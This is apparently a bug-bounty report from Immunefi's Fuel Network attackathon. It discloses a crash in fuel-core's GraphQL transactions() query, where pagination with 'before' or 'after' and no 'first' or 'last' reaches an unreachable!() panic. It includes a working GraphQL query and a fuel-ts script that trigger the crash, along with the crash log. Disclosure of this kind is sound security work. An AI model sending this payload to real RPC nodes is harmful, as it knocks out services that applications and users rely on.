# Attackathon \_ Fuel Network 32486 - \[Blockchain\_DLT - Medium] Public RPC node craches via GraphQL API

Submitted on Sun Jun 23 2024 19:31:25 GMT-0400 (Atlantic Standard Time) by @sventime for [Attackathon | Fuel Network](https://immunefi.com/bounty/fuel-network-attackathon/)

Report ID: #32486

Report type: Blockchain/DLT

Report severity: Medium

Target: <https://github.com/FuelLabs/fuel-core/tree/8b1bf02103b8c90ce3ef2ba715214fb452b99885>

Impacts:

* RPC API crash affecting projects with greater than or equal to 25% of the market capitalization on top of the respective layer

## Description

## Brief/Intro

A vulnerability in the public RPC node's GraphQL API allows attackers to crash the node by exploiting an `unreachable!()` macro in the `transactions()` query pagination logic.

## Vulnerability Details

The vulnerability exists in the pagination logic of the `transactions()` query in `crates/fuel-core/src/schema.rs:129:17:`:

```rust
let (count, direction) = if let Some(first) = first {
    (first, IterDirection::Forward)
} else if let Some(last) = last {
    (last, IterDirection::Reverse)
} else {
    // Unreachable because of the check `(None, None, None, None)` above
    unreachable!()
};
```

This code incorrectly assumes either `first` or `last` must be `Some`. However, valid scenarios exist where both are `None` while `after` or `before` or both are `Some`, leading to a panic when the `unreachable!()` macro is hit.

## Impact Details

1. Denial of Service: Repeated exploitation can cause extended RPC node downtime.
2. dApp and Front-end Failures: All dApps and front-end applications relying on the affected RPC will crash or become non-functional.
3. Reduced Trust: Frequent outages may decrease user confidence.

## References

<https://github.com/FuelLabs/fuel-core/blob/8b1bf02103b8c90ce3ef2ba715214fb452b99885/crates/fuel-core/src/schema.rs#L129>

## Proof of concept

## Proof of Concept

### Steps to reproduce

1. Compile fuel-core in release and run local or test node:
2. Open <http://localhost:4000/v1/playground> and run query:

```
query {
  transactions(before: "00000000#0x00"){
    __typename
  }
}
```

3. (Optional) You can use fuel-ts to exploit:

```
import { Provider } from "@fuel-ts/account";

async function exploit(){
  const provider = await Provider.create('http://127.0.0.1:4000/v1/graphql');

  await provider.getTransactions({before: "00000000#0x00"});
}

exploit().then(() => {}).catch(console.error);
```

> Note: You can use any values for `before` and `after` just to pass validation, the only rule is not to include `first` and `last`, but one of or both `before` and `after`.

### Result

Node crashed with error:

```
thread 'tokio-runtime-worker' panicked at crates/fuel-core/src/schema.rs:129:17:
internal error: entered unreachable code
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
[1]    27170 abort      ./target/release/fuel-core run --db-type in-memory
```
